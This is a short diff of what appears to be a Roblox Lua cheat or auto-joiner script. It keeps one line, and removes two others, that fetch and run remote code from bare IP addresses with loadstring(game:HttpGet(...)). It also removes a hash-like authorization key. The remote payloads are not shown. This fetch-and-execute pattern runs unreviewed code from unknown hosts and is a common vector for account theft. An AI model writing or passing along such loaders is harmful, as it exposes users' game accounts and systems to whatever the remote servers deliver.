@@ -1,5 +1,2 @@
 ID="0ce781d0-97cc-4116-9c39-5cc243883915";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/mm2eventVisual.lua"))()
-AUTHORIZATION_KEY="$2b$10$o5JBRGB.Bm1zXnPAz4uXcuaLcy6ckFYIb7QwBUnCqN6CoT.Lq0Xo2";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/auto-joiner.luau"))()
